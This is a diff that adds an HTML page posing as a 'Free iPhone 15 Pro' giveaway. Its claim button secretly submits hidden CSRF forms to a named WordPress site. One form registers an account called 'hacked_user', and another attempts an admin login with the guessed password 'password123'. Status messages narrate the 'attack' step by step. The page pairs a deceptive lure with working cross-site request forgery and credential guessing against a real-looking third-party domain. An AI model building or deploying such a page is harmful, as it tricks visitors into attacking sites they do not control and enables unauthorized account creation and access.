@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free iPhone Giveaway - Claim Now!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 50px;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 600px;
+            margin: 0 auto;
+            backdrop-filter: blur(10px);
+        }
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background: #ff5252;
+        }
+        .status {
+            margin: 20px;
+            font-size: 16px;
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            border-radius: 10px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 CONGRATULATIONS!</h1>
+        <p>You've been selected for a FREE iPhone 15 Pro!</p>
+        <p><strong>Click the button below to claim your prize!</strong></p>
+        
+        <button onclick="startAttack()">🚀 CLAIM YOUR FREE IPHONE NOW!</button>
+        
+        <div id="status" class="status">
+            Waiting for your click...
+        </div>
+    </div>
+
+    <!-- HIDDEN CSRF ATTACK FORMS -->
+    <div class="hidden">
+        <!-- ATTACK 1: Create User Account -->
+        <form id="attack1" action="https://rumahtamushofia.my.id/wp-login.php?action=register" method="POST">
+            <input name="user_login" value="hacked_user">
+            <input name="user_email" value="hacker@example.com">
+            <input name="wp-submit" value="Register">
+        </form>
+
+        <!-- ATTACK 2: Try Admin Login -->
+        <form id="attack2" action="https://rumahtamushofia.my.id/wp-login.php" method="POST">
+            <input name="log" value="admin">
+            <input name="pwd" value="password123">
+            <input name="wp-submit" value="Log In">
+        </form>
+    </div>
+
+    <script>
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = message;
+            console.log("🔴 CSRF: " + message);
+        }
+
+        function startAttack() {
+            updateStatus("🚀 Starting attack...");
+            
+            // Attack 1: Create user
+            setTimeout(() => {
+                updateStatus("👤 Creating user account...");
+                document.getElementById('attack1').submit();
+            }, 1000);
+            
+            // Attack 2: Try login  
+            setTimeout(() => {
+                updateStatus("🔓 Attempting admin login...");
+                document.getElementById('attack2').submit();
+            }, 3000);
+            
+            // Final status
+            setTimeout(() => {
+                updateStatus("✅ Attack completed! Check if actions were successful.");
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
